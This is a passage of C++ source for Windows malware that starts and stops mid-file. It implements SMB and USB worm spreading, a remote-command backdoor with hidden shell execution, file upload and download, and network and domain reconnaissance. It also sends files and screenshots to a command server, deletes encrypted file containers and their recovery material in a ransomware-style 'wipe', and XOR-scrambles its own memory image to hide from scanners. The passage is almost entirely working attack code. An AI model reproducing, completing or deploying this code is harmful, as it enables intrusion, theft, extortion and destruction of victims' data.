                bool ok = InfectHost(ip);
                RecordAttempt(ip, ok ? "ok" : "fail");
            }
            return 0;
        }

        static DWORD WINAPI SmbThread(LPVOID) {
            for (int pass = 0; pass < 8 && g_enabled.load(); pass++) {
                std::vector<uint32_t> hosts = EnumerateHosts(254);
                if (hosts.empty()) break;

                HostQueue queue;
                for (uint32_t ip : hosts) queue.Push(ip);
                queue.Close();

                std::vector<HANDLE> workers;
                for (uint32_t i = 0; i < config::kSpreadWorkers; i++) {
                    HANDLE h = CreateThread(NULL, 0, SmbWorker, &queue, 0, NULL);
                    if (h) workers.push_back(h);
                }
                for (HANDLE h : workers) {
                    WaitForSingleObject(h, INFINITE);
                    CloseHandle(h);
                }

                if (!g_enabled.load()) break;
                Sleep(config::kSpreadRescanMs);
            }
            return 0;
        }

        static void StartSmbSpray() {
            HANDLE h = CreateThread(NULL, 0, SmbThread, NULL, 0, NULL);
            if (h) CloseHandle(h);
        }
    } // namespace spread

    // ------------------------------------------------------------------
    // Sleeper: dormancy loop, returns "detonate" or "kill".
    // ------------------------------------------------------------------
    // ------------------------------------------------------------------
    // Remote task execution (operator-queued commands).
    // ------------------------------------------------------------------
    namespace tasks {
        struct Result {
            std::string output;
            bool lock = false;
            bool uninstall = false;
        };

        static std::string RunShell(const std::string& cmd) {
            SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };
            HANDLE rd = NULL, wr = NULL;
            if (!CreatePipe(&rd, &wr, &sa, 0)) return "[pipe failed]";
            SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

            STARTUPINFOW si{ sizeof(si) };
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            si.hStdOutput = wr;
            si.hStdError = wr;
            si.hStdInput = NULL;

            PROCESS_INFORMATION pi{};
            wchar_t comspec[MAX_PATH]{};
            if (!GetEnvironmentVariableW(L"COMSPEC", comspec, MAX_PATH)) {
                GetSystemDirectoryW(comspec, MAX_PATH);
                wcscat_s(comspec, MAX_PATH, L"\\cmd.exe");
            }
            std::wstring w = L"\"" + std::wstring(comspec) +
                L"\" /d /s /c \"" + utils::widen(cmd) + L"\"";
            std::vector<wchar_t> buf(w.begin(), w.end());
            buf.push_back(0);
            BOOL ok = CreateProcessW(NULL, buf.data(), NULL, NULL, TRUE,
                CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
            CloseHandle(wr);
            if (!ok) { CloseHandle(rd); return "[spawn failed]"; }

            std::string out;
            char tmp[4096];
            const ULONGLONG deadline = GetTickCount64() + 120000;
            for (;;) {
                DWORD avail = 0;
                if (PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL) && avail) {
                    DWORD got = 0;
                    DWORD want = avail > sizeof(tmp) ? sizeof(tmp) : avail;
                    if (ReadFile(rd, tmp, want, &got, NULL) && got)
                        out.append(tmp, got);
                    if (out.size() > 48000) break;
                }
                else {
                    if (WaitForSingleObject(pi.hProcess, 30) == WAIT_OBJECT_0) {
                        // Drain only what is buffered; a grandchild can hold the
                        // write handle open forever and must not hang the task.
                        for (;;) {
                            DWORD avail2 = 0;
                            if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail2, NULL) || !avail2)
                                break;
                            DWORD got = 0;
                            DWORD want = avail2 > sizeof(tmp) ? sizeof(tmp) : avail2;
                            if (!ReadFile(rd, tmp, want, &got, NULL) || !got) break;
                            out.append(tmp, got);
                            if (out.size() > 48000) break;
                        }
                        break;
                    }
                }
                if (GetTickCount64() > deadline) break;
            }
            if (out.size() > 48000) out.resize(48000);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(rd);
            return out;
        }

        static bool ReadWholeFile(const std::wstring& path, std::string& out) {
            HANDLE h = CreateFileW(utils::extended(path).c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            LARGE_INTEGER sz{};
            if (!GetFileSizeEx(h, &sz) || sz.QuadPart > 8ll * 1024 * 1024) {
                CloseHandle(h);
                return false;
            }
            out.resize((size_t)sz.QuadPart);
            DWORD got = 0;
            bool ok = out.empty() || (ReadFile(h, &out[0], (DWORD)out.size(), &got, NULL)
                && got == out.size());
            CloseHandle(h);
            return ok;
        }

        static bool WriteWholeFile(const std::wstring& path, const std::vector<uint8_t>& data) {
            std::wstring tmp = path + L".vxtmp." + utils::RandomHex(6);
            HANDLE h = CreateFileW(utils::extended(tmp).c_str(), GENERIC_WRITE,
                FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            DWORD wrote = 0;
            bool ok = data.empty() || (WriteFile(h, data.data(), (DWORD)data.size(),
                &wrote, NULL) && wrote == (DWORD)data.size());
            if (ok) ok = FlushFileBuffers(h) != FALSE;
            CloseHandle(h);
            if (ok) ok = MoveFileExW(utils::extended(tmp).c_str(),
                utils::extended(path).c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) != FALSE;
            if (!ok) DeleteFileW(utils::extended(tmp).c_str());
            return ok;
        }

        // ------------------------------------------------------ lateral recon
        static std::string LateralAdmins() {
            LPBYTE buf = nullptr;
            DWORD read = 0, total = 0;
            DWORD_PTR resume = 0;
            NET_API_STATUS st = NetLocalGroupGetMembers(NULL, L"Administrators", 1,
                &buf, MAX_PREFERRED_LENGTH, &read, &total, &resume);
            std::string out = "ok:\n";
            if ((st == NERR_Success || st == ERROR_MORE_DATA) && buf) {
                auto m = (LOCALGROUP_MEMBERS_INFO_1*)buf;
                for (DWORD i = 0; i < read; i++) {
                    if (m[i].lgrmi1_name) out += utils::narrow(m[i].lgrmi1_name) + "\n";
                }
                NetApiBufferFree(buf);
            }
            else {
                out += "err:NetLocalGroupGetMembers=" + std::to_string((unsigned long)st) + "\n";
            }
            return out;
        }

        static std::string LateralSessions() {
            SESSION_INFO_10* buf = nullptr;
            DWORD read = 0, total = 0;
            DWORD resume = 0;
            NET_API_STATUS st = NetSessionEnum(NULL, NULL, NULL, 10, (LPBYTE*)&buf,
                MAX_PREFERRED_LENGTH, &read, &total, &resume);
            std::string out = "ok:\n";
            if ((st == NERR_Success || st == ERROR_MORE_DATA) && buf) {
                for (DWORD i = 0; i < read; i++) {
                    std::string c = buf[i].sesi10_cname ? utils::narrow(buf[i].sesi10_cname) : "?";
                    std::string u = buf[i].sesi10_username ? utils::narrow(buf[i].sesi10_username) : "?";
                    out += c + " user=" + u + " secs=" +
                        std::to_string(buf[i].sesi10_time) + "\n";
                }
                NetApiBufferFree(buf);
            }
            else {
                out += "err:NetSessionEnum=" + std::to_string((unsigned long)st) + "\n";
            }
            return out;
        }

        static std::string LateralShares() {
            SHARE_INFO_2* buf = nullptr;
            DWORD read = 0, total = 0;
            DWORD resume = 0;
            NET_API_STATUS st = NetShareEnum(NULL, 2, (LPBYTE*)&buf,
                MAX_PREFERRED_LENGTH, &read, &total, &resume);
            std::string out = "ok:\n";
            if ((st == NERR_Success || st == ERROR_MORE_DATA) && buf) {
                for (DWORD i = 0; i < read; i++) {
                    std::string n = buf[i].shi2_netname ? utils::narrow(buf[i].shi2_netname) : "?";
                    std::string p = buf[i].shi2_path ? utils::narrow(buf[i].shi2_path) : "";
                    char hexbuf[16]{};
                    sprintf_s(hexbuf, sizeof(hexbuf), "0x%08lx", (unsigned long)buf[i].shi2_type);
                    out += n + " type=" + hexbuf;
                    if (!p.empty()) out += " path=" + p;
                    out += "\n";
                }
                NetApiBufferFree(buf);
            }
            else {
                out += "err:NetShareEnum=" + std::to_string((unsigned long)st) + "\n";
            }
            return out;
        }

        static std::string LateralDomain() {
            std::string out = "ok:\n";
            LPWSTR name = nullptr;
            NETSETUP_JOIN_STATUS jt = NetSetupUnknownStatus;
            if (NetGetJoinInformation(NULL, &name, &jt) == NERR_Success) {
                out += "join_type=" + std::to_string((int)jt) + "\n";
                out += "domain=" + (name ? utils::narrow(name) : "") + "\n";
                if (name) NetApiBufferFree(name);
            }
            WKSTA_INFO_100* wi = nullptr;
            if (NetWkstaGetInfo(NULL, 100, (LPBYTE*)&wi) == NERR_Success && wi) {
                out += "computer=" + (wi->wki100_computername ?
                    utils::narrow(wi->wki100_computername) : "") + "\n";
                out += "workgroup=" + (wi->wki100_langroup ?
                    utils::narrow(wi->wki100_langroup) : "") + "\n";
                NetApiBufferFree(wi);
            }
            return out;
        }

        static std::string LateralUsers() {
            USER_INFO_1* buf = nullptr;
            DWORD read = 0, total = 0;
            DWORD resume = 0;
            NET_API_STATUS st = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT,
                (LPBYTE*)&buf, MAX_PREFERRED_LENGTH, &read, &total, &resume);
            std::string out = "ok:\n";
            if ((st == NERR_Success || st == ERROR_MORE_DATA) && buf) {
                for (DWORD i = 0; i < read; i++) {
                    std::string n = buf[i].usri1_name ? utils::narrow(buf[i].usri1_name) : "?";
                    char flags[16]{};
                    sprintf_s(flags, sizeof(flags), "0x%08lx", (unsigned long)buf[i].usri1_flags);
                    out += n + " flags=" + flags + "\n";
                }
                NetApiBufferFree(buf);
            }
            else {
                out += "err:NetUserEnum=" + std::to_string((unsigned long)st) + "\n";
            }
            return out;
        }

        static Result Execute(const uint8_t vid[16], const std::string& type,
            const std::string& argB64, const uint8_t* key = nullptr) {
            Result r{};
            if (type == "shell") {
                std::vector<uint8_t> raw = utils::unb64(argB64);
                std::string cmd(raw.begin(), raw.end());
                r.output = RunShell(cmd);
            }
            else if (type == "pull") {
                std::vector<uint8_t> p = utils::unb64(argB64);
                std::wstring path = utils::widen(std::string(p.begin(), p.end()));
                std::string data;
                if (ReadWholeFile(path, data))
                    r.output = "ok:" + utils::b64((const uint8_t*)data.data(), data.size());
                else
                    r.output = "err:cannot read " + utils::narrow(path);
            }
            else if (type == "push") {
                std::vector<uint8_t> raw = utils::unb64(argB64);
                std::string s(raw.begin(), raw.end());
                size_t p = s.find('|');
                if (p == std::string::npos) {
                    r.output = "err:bad push payload";
                }
                else {
                    std::wstring path = utils::widen(s.substr(0, p));
                    std::vector<uint8_t> data = utils::unb64(s.substr(p + 1));
                    r.output = WriteWholeFile(path, data)
                        ? "ok:written " + utils::narrow(path)
                        : "err:write failed";
                }
            }
            else if (type == "lock") {
                r.lock = true;
                r.output = "ok:lock";
            }
            else if (type == "uninstall") {
                r.uninstall = true;
                r.output = "ok:uninstall";
            }
            else if (type == "wipe") {
                // Destruction path: delete every file named by the journal,
                // then the recovery material itself. The journal is binary
                // VXJ2 in this build; the old text parser deleted nothing and
                // still removed the recovery map.
                std::wstring jpath = config::g_wipeJournalOverride.empty()
                    ? utils::DefaultJournalPath() : config::g_wipeJournalOverride;
                std::ifstream j(utils::extended(jpath).c_str(), std::ios::binary);
                std::string data((std::istreambuf_iterator<char>(j)),
                                 std::istreambuf_iterator<char>());
                std::ifstream sj(utils::extended(jpath + L".sig").c_str(),
                                 std::ios::binary);
                std::string want((std::istreambuf_iterator<char>(sj)),
                                 std::istreambuf_iterator<char>());
                while (!want.empty() && (want.back() == '\n' || want.back() == '\r'))
                    want.pop_back();
                const std::string got = (key && !want.empty())
                    ? crypto::HmacSha256Hex(key, 32, data) : "";
                if (got.empty() || got.size() != want.size() ||
                    !std::equal(got.begin(), got.end(), want.begin(),
                        [](char a, char b) { return ::tolower(a) == ::tolower(b); })) {
                    r.output = "err:wipe refused: journal not authenticated";
                    r.uninstall = false;
                    return r;
                }
                if (data.size() < 12 || memcmp(data.data(), "VXJ2", 4) != 0) {
                    r.output = "err:wipe refused: not a VXJ2 journal";
                    r.uninstall = false;
                    return r;
                }
                bool parsed = true;
                int deleted = 0;
                size_t off = 12;
                while (off + 8 <= data.size()) {
                    uint32_t len = 0, crc = 0;
                    memcpy(&len, data.data() + off, 4);
                    memcpy(&crc, data.data() + off + 4, 4);
                    if (len == 0 || len > 65535 || off + 8 + len > data.size()) {
                        parsed = false;
                        break;
                    }
                    const uint8_t* body = (const uint8_t*)data.data() + off + 8;
                    if (crypto::Crc32(body, len) != crc) { parsed = false; break; }
                    size_t b = 24; // VXJ2 v3: times(24), sha(32), size(8), paths
                    if (len < b + 32 + 8 + 4) { parsed = false; break; }
                    b += 32 + 8;
                    uint32_t ol = 0;
                    memcpy(&ol, body + b, 4); b += 4;
                    if (b + ol + 4 > len) { parsed = false; break; }
                    std::string orig((const char*)body + b, ol);
                    b += ol;
                    uint32_t el = 0;
                    memcpy(&el, body + b, 4); b += 4;
                    if (b + el > len) { parsed = false; break; }
                    std::string enc((const char*)body + b, el);
                    std::string plain;
                    for (size_t i = 0; i < enc.size(); i++) {
                        if (enc[i] == '\\' && i + 1 < enc.size()) plain.push_back(enc[++i]);
                        else plain.push_back(enc[i]);
                    }
                    std::wstring w = utils::widen(plain);
                    if (w.empty()) { parsed = false; break; }
                    HANDLE fh = CreateFileW(utils::extended(w).c_str(), GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (fh == INVALID_HANDLE_VALUE) {
                        parsed = false;
                        break;
                    }
                    char m[4]{};
                    DWORD rd = 0;
                    bool isContainer = ReadFile(fh, m, 4, &rd, NULL) && rd == 4 &&
                        memcmp(m, "VEX2", 4) == 0;
                    CloseHandle(fh);
                    if (!isContainer) { parsed = false; break; }
                    if (!DeleteFileW(utils::extended(w).c_str())) {
                        parsed = false; break;
                    }
                    deleted++;
                    off += 8 + len;
                }
                if (off != data.size()) parsed = false;
                j.close();
                if (!parsed) {
                    r.output = "err:wipe journal corrupt; recovery material kept";
                    r.uninstall = false;
                    return r;
                }
                DeleteFileW(utils::extended(jpath).c_str());
                DeleteFileW(utils::extended(jpath + L".sig").c_str());
                DeleteFileW(utils::extended(jpath + L".done").c_str());
                if (!config::g_wipeTestMode) {
                    DeleteFileW(utils::extended(state::FilePath()).c_str());
                    DeleteFileW(utils::extended(state::DirPath() + L"\\proof.txt").c_str());
                    DeleteFileW(utils::extended(state::DirPath() + L"\\sec").c_str());
                    DeleteFileW(utils::extended(state::DirPath() + L"\\c2h").c_str());
                    persist::Remove();
                }
                r.output = "ok:wipe deleted=" + std::to_string(deleted);
                r.uninstall = true;
            }
            else if (type == "ls") {
                std::vector<uint8_t> p = utils::unb64(argB64);
                std::wstring dir = utils::widen(std::string(p.begin(), p.end()));
                if (dir.empty()) dir = L"C:\\";
                WIN32_FIND_DATAW fd{};
                HANDLE h = FindFirstFileW(utils::extended(dir + L"\\*").c_str(), &fd);
                if (h == INVALID_HANDLE_VALUE) {
                    r.output = "err:cannot list " + utils::narrow(dir);
                }
                else {
                    std::string out;
                    do {
                        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
                            continue;
                        bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                        ULARGE_INTEGER sz{};
                        sz.LowPart = fd.nFileSizeLow;
                        sz.HighPart = fd.nFileSizeHigh;
                        out += isDir ? "d " : "f ";
                        out += utils::narrow(fd.cFileName);
                        if (!isDir) out += " " + std::to_string(sz.QuadPart);
                        out += "\n";
                        if (out.size() > 40000) break;
                    } while (FindNextFileW(h, &fd));
                    FindClose(h);
                    r.output = "ok:\n" + out;
                }
            }
            else if (type == "recon") {
                wchar_t computer[256]{}, user[256]{}, domain[256]{};
                DWORD cl = 256, ul = 256, dl = 256;
                GetComputerNameW(computer, &cl);
                GetUserNameW(user, &ul);
                GetComputerNameExW(ComputerNameDnsDomain, domain, &dl);

                OSVERSIONINFOW os{ sizeof(os) };
#pragma warning(push)
#pragma warning(disable: 4996)
                GetVersionExW(&os);
#pragma warning(pop)

                std::string out;
                out += "computer=" + utils::narrow(computer) + "\n";
                out += "user=" + utils::narrow(user) + "\n";
                out += "domain=" + utils::narrow(domain) + "\n";
                out += "os=" + std::to_string(os.dwMajorVersion) + "." +
                    std::to_string(os.dwMinorVersion) + "." +
                    std::to_string(os.dwBuildNumber) + "\n";
                out += "uptime_min=" + std::to_string(GetTickCount64() / 60000) + "\n";
                out += "processes:\n";
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap != INVALID_HANDLE_VALUE) {
                    PROCESSENTRY32W pe{ sizeof(pe) };
                    int n = 0;
                    if (Process32FirstW(snap, &pe)) {
                        do {
                            out += "  " + utils::narrow(pe.szExeFile) + " " +
                                std::to_string(pe.th32ProcessID) + "\n";
                            if (++n >= 120) break;
                        } while (Process32NextW(snap, &pe));
                    }
                    CloseHandle(snap);
                }
                r.output = "ok:\n" + out;
            }
            else if (type == "admins") {
                r.output = LateralAdmins();
            }
            else if (type == "sessions") {
                r.output = LateralSessions();
            }
            else if (type == "shares") {
                r.output = LateralShares();
            }
            else if (type == "domain") {
                r.output = LateralDomain();
            }
            else if (type == "spread") {
                std::vector<uint8_t> raw = utils::unb64(argB64);
                std::string mode(raw.begin(), raw.end());
                if (mode == "status") {
                    r.output = "ok:spread enabled=" +
                        std::string(spread::Enabled() ? "1" : "0") +
                        " infected=" + std::to_string(spread::InfectedCount()) +
                        " attempted=" + std::to_string(spread::AttemptedCount());
                }
                else {
                    bool on = (mode != "off");
                    spread::SetEnabled(on);
                    r.output = std::string("ok:spread ") + (on ? "on" : "off");
                }
            }
            else if (type == "smbexec") {
                std::vector<uint8_t> raw = utils::unb64(argB64);
                std::string a(raw.begin(), raw.end());
                size_t p = a.find('|');
                if (p == std::string::npos) {
                    r.output = "err:expected host|command";
                }
                else {
                    std::string host = a.substr(0, p);
                    std::string cmd = a.substr(p + 1);
                    bool valid = !host.empty() && host.size() < 253 && !cmd.empty();
                    for (char c : host) {
                        if (!(isalnum((unsigned char)c) || c == '.' || c == '-'))
                            valid = false;
                    }
                    if (!valid) {
                        r.output = "err:bad host or command";
                    }
                    else {
                        std::string out;
                        bool ok = spread::RunRemoteCommand(utils::widen(host),
                            utils::widen(cmd), out);
                        r.output = ok ? ("ok:\n" + out) : "err:smbexec failed";
                    }
                }
            }
            else if (type == "usb") {
                std::vector<uint8_t> raw = utils::unb64(argB64);
                std::string mode(raw.begin(), raw.end());
                if (mode == "status") {
                    r.output = "ok:usb enabled=" +
                        std::string(spread::UsbEnabled() ? "1" : "0") +
                        " infections=" + std::to_string(spread::UsbCount());
                }
                else {
                    bool on = (mode != "off");
                    spread::SetUsbEnabled(on);
                    r.output = std::string("ok:usb ") + (on ? "on" : "off");
                }
            }
            else if (type == "netenum") {
                auto hosts = spread::EnumerateHosts(128);
                std::string out = "ok:\n";
                for (uint32_t ip : hosts) out += spread::IpToString(ip) + "\n";
                r.output = out;
            }
            else if (type == "users") {
                r.output = LateralUsers();
            }
            else if (type == "exfil") {
                std::vector<uint8_t> p = utils::unb64(argB64);
                std::wstring path = utils::widen(std::string(p.begin(), p.end()));
                std::string data;
                if (!ReadWholeFile(path, data)) {
                    r.output = "err:cannot read " + utils::narrow(path);
                }
                else {
                    const size_t CHUNK = 1024 * 1024;
                    int total = (int)((data.size() + CHUNK - 1) / CHUNK);
                    if (total == 0) total = 1;
                    int sent = 0;
                    std::string name = utils::narrow(path);
                    size_t slash = name.find_last_of("\\/");
                    if (slash != std::string::npos) name = name.substr(slash + 1);
                    bool v2ok = comms::UploadV2(vid, name, data);
                    if (!v2ok) {
                        std::string xfer = utils::narrow(utils::RandomHex(8));
                        for (int i = 0; i < total; i++) {
                            size_t off = (size_t)i * CHUNK;
                            size_t len = (std::min)(CHUNK, data.size() - off);
                            if (comms::Upload(vid, name, i, total, data.substr(off, len), xfer))
                                sent++;
                            else
                                break;
                        }
                    }
                    r.output = (v2ok ? "ok:exfilv2 " : "ok:exfil ") + name +
                        " chunks=" + std::to_string(v2ok ? total : sent) + "/" +
                        std::to_string(total);
                }
            }
            else if (type == "screenshot") {
                int w = GetSystemMetrics(SM_CXSCREEN);
                int h = GetSystemMetrics(SM_CYSCREEN);
                if (w <= 0 || h <= 0 || w > 8192 || h > 8192 ||
                    (int64_t)w * h > 64ll * 1024 * 1024) {
                    r.output = "err:screen too large";
                }
                else {
                    HDC hdc = GetDC(NULL);
                    HDC mem = CreateCompatibleDC(hdc);
                    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
                    HGDIOBJ old = SelectObject(mem, bmp);
                    BOOL copied = BitBlt(mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

                    BITMAPINFOHEADER bi{};
                    bi.biSize = sizeof(bi);
                    bi.biWidth = w;
                    bi.biHeight = -h;
                    bi.biPlanes = 1;
                    bi.biBitCount = 32;
                    bi.biCompression = BI_RGB;

                    std::vector<uint8_t> pix((size_t)w * 4 * h);
                    bool got = copied && GetDIBits(mem, bmp, 0, h, pix.data(),
                        (BITMAPINFO*)&bi, DIB_RGB_COLORS) != 0;

                    SelectObject(mem, old);
                    DeleteObject(bmp);
                    DeleteDC(mem);
                    ReleaseDC(NULL, hdc);

                    if (!got) {
                        r.output = "err:capture failed";
                    }
                    else {
                        BITMAPFILEHEADER fh{};
                        fh.bfType = 0x4D42;
                        fh.bfOffBits = sizeof(fh) + sizeof(bi);
                        fh.bfSize = fh.bfOffBits + (DWORD)pix.size();
                        wchar_t tmp[MAX_PATH]{};
                        GetTempPathW(MAX_PATH, tmp);
                        std::wstring path = std::wstring(tmp) + L"~vxshot_" +
                            utils::RandomHex(8) + L".bmp";
                        HANDLE hf = CreateFileW(utils::extended(path).c_str(),
                            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
                        bool wrote = false;
                        if (hf != INVALID_HANDLE_VALUE) {
                            DWORD wr = 0;
                            wrote = WriteFile(hf, &fh, sizeof(fh), &wr, NULL) &&
                                WriteFile(hf, &bi, sizeof(bi), &wr, NULL) &&
                                WriteFile(hf, pix.data(), (DWORD)pix.size(), &wr, NULL);
                            CloseHandle(hf);
                        }
                        if (!wrote) {
                            r.output = "err:write failed";
                        }
                        else {
                            std::string data((const char*)pix.data(), pix.size());
                            const size_t CHUNK = 1024 * 1024;
                            int total = (int)((data.size() + CHUNK - 1) / CHUNK);
                            std::string xfer = utils::narrow(utils::RandomHex(8));
                            for (int i = 0; i < total; i++) {
                                size_t off = (size_t)i * CHUNK;
                                size_t len = (std::min)(CHUNK, data.size() - off);
                                comms::Upload(vid, "screenshot.bmp", i, total,
                                    data.substr(off, len), xfer);
                            }
                            DeleteFileW(utils::extended(path).c_str());
                            r.output = "ok:screenshot " + std::to_string(total) + " chunks";
                        }
                    }
                }
            }
            else if (type == "reboot") {
                utils::EnablePrivilege(L"SeShutdownPrivilege");
                ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, 0);
                r.output = "ok:reboot";
            }
            else {
                r.output = "err:unknown command";
            }
            return r;
        }
    } // namespace tasks

    // ------------------------------------------------------------------
    // Dormant image obfuscation. A helper process suspends every payload
    // thread, XOR-scrambles the whole mapped image, sleeps, restores it and
    // resumes the threads. A scanner looking at the parent while it sleeps
    // sees no markers, headers or strings.
    // ------------------------------------------------------------------
    namespace sleepcrypt {
        extern "C" IMAGE_DOS_HEADER __ImageBase;
        extern "C" const char kMemMarker[] = "VEX_MEM_MARKER_9f3a7c";
        volatile const char* g_markerRef = kMemMarker;

        struct Shared {
            uint32_t magic;
            uint64_t base;
            uint64_t size;
            uint8_t  key[64];
        };
        static constexpr uint32_t kSharedMagic = 0x56585343; // "VXSC"

        static void XorBuf(uint8_t* p, size_t n, const uint8_t key[64]) {
            for (size_t i = 0; i < n; i++) p[i] ^= key[i & 63];
        }

        static bool CryptImage(HANDLE hp, const Shared& sh) {
            uint8_t* buf = (uint8_t*)malloc(1 << 20);
            if (!buf) return false;
            bool ok = true;
            uint64_t addr = sh.base;
            const uint64_t end = sh.base + sh.size;
            while (addr < end) {
                MEMORY_BASIC_INFORMATION mbi{};
                if (!VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi))) break;
                uint64_t rbase = (uint64_t)mbi.BaseAddress;
                size_t rsize = mbi.RegionSize;
                if (rbase >= end) break;
                uint64_t start = rbase < sh.base ? sh.base : rbase;
                uint64_t stop = (rbase + rsize) > end ? end : (rbase + rsize);
                if (stop <= start || mbi.State != MEM_COMMIT ||
                    (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD))) {
                    addr = rbase + rsize;
                    continue;
                }
                size_t len = (size_t)(stop - start);
                DWORD old = 0;
                if (!VirtualProtectEx(hp, (LPVOID)start, len, PAGE_READWRITE, &old)) {
                    ok = false;
                    addr = rbase + rsize;
                    continue;
                }
                size_t done = 0;
                bool regionOk = true;
                while (done < len) {
                    size_t chunk = (std::min)(len - done, (size_t)(1 << 20));
                    SIZE_T rd = 0, wr = 0;
                    if (!ReadProcessMemory(hp, (LPCVOID)(start + done), buf, chunk, &rd) ||
                        rd != chunk) {
                        regionOk = false;
                        break;
                    }
                    XorBuf(buf, chunk, sh.key);
                    if (!WriteProcessMemory(hp, (LPVOID)(start + done), buf, chunk, &wr) ||
                        wr != chunk) {
                        regionOk = false;
                        break;
                    }
                    done += chunk;
                }
                if (!regionOk) {
                    // Undo whatever this region already got, so a partial
                    // failure never leaves the image half-scrambled.
                    size_t back = 0;
                    while (back < done) {
                        size_t chunk = (std::min)(done - back, (size_t)(1 << 20));
                        SIZE_T rd = 0, wr = 0;
                        if (!ReadProcessMemory(hp, (LPCVOID)(start + back), buf,
                                               chunk, &rd) || rd != chunk) break;
                        XorBuf(buf, chunk, sh.key);
                        if (!WriteProcessMemory(hp, (LPVOID)(start + back), buf,
                                                chunk, &wr) || wr != chunk) break;
                        back += chunk;
                    }
                    ok = false;
                }
                DWORD tmp = 0;
                VirtualProtectEx(hp, (LPVOID)start, len, old, &tmp);
                addr = rbase + rsize;
            }
            free(buf);
            return ok;
        }

        typedef LONG(NTAPI* NtProcessFn)(HANDLE);
        static NtProcessFn g_ntSuspend = nullptr;
        static NtProcessFn g_ntResume = nullptr;

        static void DoSleepCycle(HANDLE hp, Shared* sh, DWORD ms,
            HANDLE* threads, DWORD nthreads, bool processSuspended) {
            bool encrypted = false;
            __try {
                encrypted = CryptImage(hp, *sh);
                if (encrypted) Sleep(ms);
            }
            __finally {
                if (encrypted) CryptImage(hp, *sh);
                if (processSuspended && g_ntResume) {
                    g_ntResume(hp);
                }
                else {
                    for (DWORD i = 0; i < nthreads; i++) {
                        ResumeThread(threads[i]);
                        CloseHandle(threads[i]);
                    }
                }
            }
        }

        static int HelperMain(int argc, char** argv) {
            if (argc < 6) return 2;
            DWORD pid = (DWORD)strtoul(argv[2], NULL, 10);
            DWORD ms = (DWORD)strtoul(argv[3], NULL, 10);
            std::wstring mapName = utils::widen(argv[4]);
            std::wstring evtName = utils::widen(argv[5]);

            HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, evtName.c_str());
            if (!ev) return 4;
            HANDLE hp = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ |
                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION |
                PROCESS_SUSPEND_RESUME, FALSE, pid);
            if (!hp) { SetEvent(ev); CloseHandle(ev); return 3; }
            wchar_t targetPath[MAX_PATH]{}, selfPath[MAX_PATH]{};
            DWORD tlen = MAX_PATH, slen = GetModuleFileNameW(NULL, selfPath, MAX_PATH);
            if (!QueryFullProcessImageNameW(hp, 0, targetPath, &tlen) ||
                !slen || _wcsicmp(targetPath, selfPath) != 0) {
                SetEvent(ev); CloseHandle(ev); CloseHandle(hp);
                return 3; // only the same image may be scrambled
            }
            HANDLE hm = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE,
                FALSE, mapName.c_str());
            if (!hm) {
                SetEvent(ev); CloseHandle(ev); CloseHandle(hp);
                return 4;
            }
            Shared* sh = (Shared*)MapViewOfFile(hm, FILE_MAP_READ | FILE_MAP_WRITE,
                0, 0, sizeof(Shared));
            if (!sh) {
                SetEvent(ev);
                CloseHandle(hm); CloseHandle(ev); CloseHandle(hp);
                return 5;
            }
            if (sh->magic != kSharedMagic) {
                UnmapViewOfFile(sh);
                SetEvent(ev);
                CloseHandle(hm); CloseHandle(ev); CloseHandle(hp);
                return 5;
            }

            DWORD capacity = 256, nthreads = 0;
            HANDLE* threads = (HANDLE*)calloc(capacity, sizeof(HANDLE));
            bool processSuspended = false;
            HMODULE nt = GetModuleHandleW(L"ntdll.dll");
            if (nt) {
                g_ntSuspend = (NtProcessFn)GetProcAddress(nt, X("NtSuspendProcess").c_str());
                g_ntResume = (NtProcessFn)GetProcAddress(nt, X("NtResumeProcess").c_str());
            }
            if (g_ntSuspend && g_ntResume && g_ntSuspend(hp) == 0) {
                processSuspended = true;
            }
            if (!processSuspended) {
                if (!threads) {
                    SetEvent(ev);
                    UnmapViewOfFile(sh);
                    CloseHandle(hm); CloseHandle(ev); CloseHandle(hp);
                    return 3;
                }
                bool failed = false;
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                if (snap != INVALID_HANDLE_VALUE) {
                    THREADENTRY32 te{ sizeof(te) };
                    if (Thread32First(snap, &te)) {
                        do {
                            if (te.th32OwnerProcessID != pid) continue;
                            HANDLE th = OpenThread(THREAD_SUSPEND_RESUME, FALSE,
                                te.th32ThreadID);
                            if (!th) { failed = true; break; }
                            if (SuspendThread(th) == (DWORD)-1) {
                                CloseHandle(th); failed = true; break;
                            }
